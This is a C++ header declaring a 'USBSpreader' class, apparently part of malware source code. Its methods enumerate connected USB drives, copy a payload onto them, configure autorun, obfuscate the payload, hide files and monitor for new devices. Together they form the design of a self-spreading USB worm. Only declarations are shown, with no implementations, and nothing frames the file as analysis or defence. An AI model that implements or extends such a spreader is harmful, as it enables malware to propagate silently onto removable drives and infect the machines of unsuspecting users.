#ifndef USBSPREADER_H
#define USBSPREADER_H

#include <string>
#include <vector>
#include <map>

class USBSpreader {
public:
    USBSpreader();
    void configure(const std::string &configFilePath);
    void spread(const std::string &payloadPath);

private:
    std::vector<std::string> getConnectedUSBDevices();
    void copyPayloadToUSB(const std::string &usbDevice, const std::string &payloadPath);
    void monitorUSBConnections();
    void autoRunSetup(const std::string &usbDevice, const std::string &payloadPath);
    void obfuscatePayload(const std::string &payloadPath);
    void logActivity(const std::string &activity);
    void handleErrors(const std::string &error);
    void cacheResults(const std::string &device, const std::string &result);
    void recoverFromErrors();
    void setupHiddenFiles(const std::string &usbDevice, const std::string &payloadPath);

    std::vector<std::string> usbDevices;
    std::string configFilePath;
    std::map<std::string, std::string> cachedResults;
};

#endif // USBSPREADER_H

